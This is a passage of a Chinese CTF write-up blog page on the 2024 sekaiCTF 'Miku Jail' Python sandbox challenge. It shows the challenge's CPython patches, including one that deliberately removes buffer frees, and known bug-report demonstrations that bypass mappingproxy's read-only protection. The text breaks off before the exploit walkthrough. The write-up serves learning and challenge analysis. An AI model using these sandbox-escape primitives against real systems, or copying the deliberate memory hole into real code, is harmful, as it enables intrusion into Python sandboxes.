@@ -1,0 +1,969 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="这几天做梦都在打断点调试捋逻辑……">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 sekaiCTF Miku Jail wp">
+<meta property="og:url" content="http://akaieurus.github.io/2024/08/31/sekai2024jailwp/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="这几天做梦都在打断点调试捋逻辑……">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc61.jpg">
+<meta property="article:published_time" content="2024-08-31T08:22:52.000Z">
+<meta property="article:modified_time" content="2025-01-03T11:20:38.817Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="pyjail">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc61.jpg">
+  
+  
+  
+  <title>2024 sekaiCTF Miku Jail wp - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc61.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2024 sekaiCTF Miku Jail wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-31 16:22" pubdate>
+          2024年8月31日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024 sekaiCTF Miku Jail wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>这几天做梦都在打断点调试捋逻辑……</p>
+<span id="more"></span>
+
+<p>misc？pwn！第一次做pyjail</p>
+<h1 id="irs-amp-diff"><a href="#irs-amp-diff" class="headerlink" title="irs &amp; diff"></a>irs &amp; diff</h1><ul>
+<li><p>hook了audit事件，提到了一个dice的题</p>
+</li>
+<li><p>但dice那题用的是bytearray的uaf，这题直接把free patch了：）</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/Modules/_io/bufferedio.c b/Modules/_io/bufferedio.c</span><br><span class="hljs-comment">index e87d04bd07a..c5f940233ba 100644</span><br><span class="hljs-comment">--- a/Modules/_io/bufferedio.c</span><br><span class="hljs-comment">+++ b/Modules/_io/bufferedio.c</span><br><span class="hljs-meta">@@ -416,7 +416,7 @@</span> buffered_dealloc(buffered *self)<br>     if (self-&gt;weakreflist != NULL)<br>         PyObject_ClearWeakRefs((PyObject *)self);<br>     if (self-&gt;buffer) &#123;<br><span class="hljs-deletion">-        PyMem_Free(self-&gt;buffer);</span><br><span class="hljs-addition">+        //PyMem_Free(self-&gt;buffer);</span><br>         self-&gt;buffer = NULL;<br>     &#125;<br>     if (self-&gt;lock) &#123;<br><span class="hljs-meta">@@ -566,7 +566,7 @@</span> _io__Buffered_close_impl(buffered *self)<br>     res = PyObject_CallMethodNoArgs(self-&gt;raw, &amp;_Py_ID(close));<br> <br>     if (self-&gt;buffer) &#123;<br><span class="hljs-deletion">-        PyMem_Free(self-&gt;buffer);</span><br><span class="hljs-addition">+        //PyMem_Free(self-&gt;buffer);</span><br>         self-&gt;buffer = NULL;<br>     &#125;<br> <br><span class="hljs-meta">@@ -798,8 +798,8 @@</span> _buffered_init(buffered *self)<br>             &quot;buffer size must be strictly positive&quot;);<br>         return -1;<br>     &#125;<br><span class="hljs-deletion">-    if (self-&gt;buffer)</span><br><span class="hljs-deletion">-        PyMem_Free(self-&gt;buffer);</span><br><span class="hljs-addition">+    //if (self-&gt;buffer)</span><br><span class="hljs-addition">+    //    PyMem_Free(self-&gt;buffer);</span><br>     self-&gt;buffer = PyMem_Malloc(self-&gt;buffer_size);<br>     if (self-&gt;buffer == NULL) &#123;<br>         PyErr_NoMemory();<br></code></pre></td></tr></table></figure>
+
+<p><em>像极了打awd的我……</em></p>
+</li>
+<li><p>还禁了类型转换，要求类型必须匹配</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/Objects/bytearrayobject.c b/Objects/bytearrayobject.c</span><br><span class="hljs-comment">index 07c20ac6316..21d1036e4a9 100644</span><br><span class="hljs-comment">--- a/Objects/bytearrayobject.c</span><br><span class="hljs-comment">+++ b/Objects/bytearrayobject.c</span><br><span class="hljs-meta">@@ -512,6 +512,11 @@</span> static int<br> bytearray_setslice(PyByteArrayObject *self, Py_ssize_t lo, Py_ssize_t hi,<br>                PyObject *values)<br> &#123;<br><span class="hljs-addition">+    if (!PyList_CheckExact(values) &amp;&amp; !PyLong_CheckExact(values) &amp;&amp; !PyBytes_CheckExact(value</span><br>s))<br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;nope&quot;);</span><br><span class="hljs-addition">+        return 0;</span><br><span class="hljs-addition">+    &#125;</span><br>     Py_ssize_t needed;<br>     void *bytes;<br>     Py_buffer vbytes;<br><span class="hljs-meta">@@ -561,6 +566,11 @@</span> bytearray_setslice(PyByteArrayObject *self, Py_ssize_t lo, Py_ssize_t hi,<br> static int<br> bytearray_setitem(PyByteArrayObject *self, Py_ssize_t i, PyObject *value)<br> &#123;<br><span class="hljs-addition">+    if (!PyLong_CheckExact(value))</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;no&quot;);</span><br><span class="hljs-addition">+        return -1;</span><br><span class="hljs-addition">+    &#125;</span><br>     int ival = -1;<br> <br>     // GH-91153: We need to do this *before* the size check, in case value has a<br><span class="hljs-meta">@@ -590,6 +600,16 @@</span> bytearray_setitem(PyByteArrayObject *self, Py_ssize_t i, PyObject *value)<br> static int<br> bytearray_ass_subscript(PyByteArrayObject *self, PyObject *index, PyObject *values)<br> &#123;<br><span class="hljs-addition">+    if (!PyList_CheckExact(values) &amp;&amp; !PyLong_CheckExact(values))</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;nope&quot;);</span><br><span class="hljs-addition">+        return -1;</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+    if (!PyLong_CheckExact(index))</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;nope&quot;);</span><br><span class="hljs-addition">+        return -1;</span><br><span class="hljs-addition">+    &#125;</span><br>     Py_ssize_t start, stop, step, slicelen, needed;<br>     char *buf, *bytes;<br>     buf = PyByteArray_AS_STRING(self);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><em>后面一直在想怎么用这个东西，结果其实这个patch的意思是把这玩意ban了o(TヘTo)</em></p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/Objects/descrobject.c b/Objects/descrobject.c</span><br><span class="hljs-comment">index a6c90e7ac13..36030ad1caa 100644</span><br><span class="hljs-comment">--- a/Objects/descrobject.c</span><br><span class="hljs-comment">+++ b/Objects/descrobject.c</span><br><span class="hljs-meta">@@ -1210,7 +1210,7 @@</span> mappingproxy_traverse(PyObject *self, visitproc visit, void *arg)<br> static PyObject *<br> mappingproxy_richcompare(mappingproxyobject *v, PyObject *w, int op)<br> &#123;<br><span class="hljs-deletion">-    return PyObject_RichCompare(v-&gt;mapping, w, op);</span><br><span class="hljs-addition">+    return PyObject_RichCompare(v, w, op);</span><br> &#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="一些思维路径"><a href="#一些思维路径" class="headerlink" title="一些思维路径~"></a>一些思维路径~</h1><h2 id="MappingProxyType"><a href="#MappingProxyType" class="headerlink" title="MappingProxyType"></a>MappingProxyType</h2><p>首先，为什么要ban mappingproxy_richcompare，这个mappingproxy是什么东西</p>
+<ul>
+<li><p>首先看一个常见的东西，dict字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>test_dict = &#123;<span class="hljs-string">&#x27;test1&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">&#x27;test2&#x27;</span>: <span class="hljs-string">&#x27;test2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(test_dict)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>mappingproxy和dict类似，也可以基于dict创建</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> types <span class="hljs-keyword">import</span> MappingProxyType<br><span class="hljs-meta">&gt;&gt;&gt; </span>test_mapping = MappingProxyType(test_dict)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(test_mapping)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;mappingproxy&#x27;</span>&gt;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>但它是只读的，尝试修改会报错</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>test_mapping[<span class="hljs-string">&#x27;test1&#x27;</span>]=<span class="hljs-string">&#x27;test&#x27;</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-string">&#x27;mappingproxy&#x27;</span> <span class="hljs-built_in">object</span> does <span class="hljs-keyword">not</span> support item assignment<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>那这个玩意有什么用呢？对象有一个内置属性__dict__，用于存储对象的属性</p>
+<ul>
+<li><p>class的实例的__dict__是dict类型的，可以修改</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-meta">... </span>            self.test1=<span class="hljs-string">&#x27;test1&#x27;</span><br><span class="hljs-meta">... </span>            self.test2=<span class="hljs-string">&#x27;test2&#x27;</span><br><span class="hljs-meta">... </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a = A()<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(a.__dict__)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a.__dict__<br>&#123;<span class="hljs-string">&#x27;test1&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">&#x27;test2&#x27;</span>: <span class="hljs-string">&#x27;test2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a.__dict__[<span class="hljs-string">&#x27;test1&#x27;</span>]=<span class="hljs-string">&#x27;test111&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a.test1<br><span class="hljs-string">&#x27;test111&#x27;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>class本身的__dict__是mappingproxy类型的，不可修改</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(A.__dict__)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;mappingproxy&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>A.__dict__<br>mappingproxy(&#123;<span class="hljs-string">&#x27;__module__&#x27;</span>: <span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>: &lt;function A.__init__ at <span class="hljs-number">0x7f25181bc540</span>&gt;, <span class="hljs-string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="hljs-string">&#x27;__dict__&#x27;</span> of <span class="hljs-string">&#x27;A&#x27;</span> objects&gt;, <span class="hljs-string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="hljs-string">&#x27;__weakref__&#x27;</span> of <span class="hljs-string">&#x27;A&#x27;</span> objects&gt;, <span class="hljs-string">&#x27;__doc__&#x27;</span>: <span class="hljs-literal">None</span>&#125;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>A.__dict__[<span class="hljs-string">&#x27;__module__&#x27;</span>]=<span class="hljs-string">&#x27;test&#x27;</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-string">&#x27;mappingproxy&#x27;</span> <span class="hljs-built_in">object</span> does <span class="hljs-keyword">not</span> support item assignment<br></code></pre></td></tr></table></figure>
+
+<p>使用mappingproxy的__dict__可以禁止修改class的属性</p>
+</li>
+</ul>
+</li>
+<li><p>有一个issue可以用实例自定义的__eq__方法修改只读的mappingproxy</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://bugs.python.org/issue43838</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Sneaky</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br><span class="hljs-meta">... </span>        other[<span class="hljs-string">&#x27;real&#x27;</span>] = <span class="hljs-number">42</span><br><span class="hljs-meta">... </span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">int</span>.__dict__ == Sneaky()<br><span class="hljs-meta">&gt;&gt;&gt; </span>(<span class="hljs-number">1</span>).real<br><span class="hljs-number">42</span><br></code></pre></td></tr></table></figure>
+
+<p>mappingproxy的__eq__调用的就是mappingproxy_richcompare函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> PyObject *<br><span class="hljs-title function_">mappingproxy_richcompare</span><span class="hljs-params">(mappingproxyobject *v, PyObject *w, <span class="hljs-type">int</span> op)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> PyObject_RichCompare(v-&gt;mapping, w, op);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>mappingproxy_richcompare会直接使用v-&gt;mapping继续向下一层比较</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> types <span class="hljs-keyword">import</span> MappingProxyType<br><br>test_dict = &#123;<span class="hljs-string">&#x27;test1&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">&#x27;test2&#x27;</span>: <span class="hljs-string">&#x27;test2&#x27;</span>&#125;<br>test_mapping = MappingProxyType(test_dict)<br>test_mapping == test_dict<br></code></pre></td></tr></table></figure>
+
+<p>这里test_mapping基于test_dict创建，那v-&gt;mapping就指向test_dict</p>
+<img src="/2024/08/31/sekai2024jailwp/w_eq_v.png" srcset="/img/loading.gif" lazyload class title="w_eq_v">
+</li>
+<li><p>PyObject_RichCompare是PyObject通用的__eq__函数，会继续向下一层层比较</p>
+</li>
+<li><p>这时候mapping指向的原始对象已经没有了mappingproxy的只读wrap</p>
+</li>
+<li><p>patch不进行mapping的向下比较就会导致一个死循环……</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> PyObject_RichCompare(v, w, op);<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/08/31/sekai2024jailwp/loop.png" srcset="/img/loading.gif" lazyload class title="loop">
+</li>
+<li><p>但另一个issue里使用__ror__可以达到相同的效果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://bugs.python.org/issue44596</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">SneakyOr</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__or__</span>(<span class="hljs-params">self, other</span>):<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">if</span> other <span class="hljs-keyword">is</span> d:<br><span class="hljs-meta">... </span>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Broke encapsulation&quot;</span>)<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__ror__</span>(<span class="hljs-params">self, other</span>):<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">return</span> self.__or__(other)<br><span class="hljs-meta">... </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proxy | SneakyOr()<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">6</span>, <span class="hljs-keyword">in</span> __ror__<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">4</span>, <span class="hljs-keyword">in</span> __or__<br>RuntimeError: Broke encapsulation<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> PyObject *<br><span class="hljs-title function_">mappingproxy_or</span><span class="hljs-params">(PyObject *left, PyObject *right)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (PyObject_TypeCheck(left, &amp;PyDictProxy_Type)) &#123;<br>        left = ((mappingproxyobject*)left)-&gt;mapping;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (PyObject_TypeCheck(right, &amp;PyDictProxy_Type)) &#123;<br>        right = ((mappingproxyobject*)right)-&gt;mapping;<br>    &#125;<br>    <span class="hljs-keyword">return</span> PyNumber_Or(left, right);<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="非法修改，然后呢？"><a href="#非法修改，然后呢？" class="headerlink" title="非法修改，然后呢？"></a>非法修改，然后呢？</h2><p>先过一遍部分exp的执行流程吧</p>
